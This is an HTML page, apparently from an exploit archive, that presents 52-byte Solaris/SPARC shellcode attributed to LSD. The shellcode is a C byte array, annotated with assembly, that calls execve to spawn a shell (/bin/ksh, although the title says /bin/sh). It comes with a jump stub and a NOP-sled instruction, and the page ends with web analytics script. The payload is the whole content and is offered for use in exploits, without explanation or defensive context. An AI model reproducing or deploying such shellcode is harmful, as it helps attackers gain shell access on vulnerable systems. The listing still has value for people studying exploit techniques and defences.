<html><head><title>Solaris/sparc - execve(/bin/sh) - 52 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
//Solaris/Sparc - LSD
char shellcode[]=
    &quot;\x20\xbf\xff\xff&quot;     /* bn,a    &lt;_shellcode-4&gt;        */
    &quot;\x20\xbf\xff\xff&quot;     /* bn,a    &lt;_shellcode&gt;          */
    &quot;\x7f\xff\xff\xff&quot;     /* call    &lt;_shellcode+4&gt;        */
    &quot;\x90\x03\xe0\x20&quot;     /* add     %o7,32,%o0           */
    &quot;\x92\x02\x20\x10&quot;     /* add     %o0,16,%o1           */
    &quot;\xc0\x22\x20\x08&quot;     /* st      %g0,[%o0+8]          */
    &quot;\xd0\x22\x20\x10&quot;     /* st      %o0,[%o0+16]         */
    &quot;\xc0\x22\x20\x14&quot;     /* st      %g0,[%o0+20]         */
    &quot;\x82\x10\x20\x0b&quot;     /* mov     0xb,%g1              */
    &quot;\x91\xd0\x20\x08&quot;     /* ta      8                    */
    &quot;/bin/ksh&quot;
;

char jump[]=
    &quot;\x81\xc3\xe0\x08&quot;     /* jmp     %o7+8                */
    &quot;\x90\x10\x00\x0e&quot;     /* mov     %sp,%o0              */
;

static char nop[]=&quot;\x80\x1c\x40\x11&quot;;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
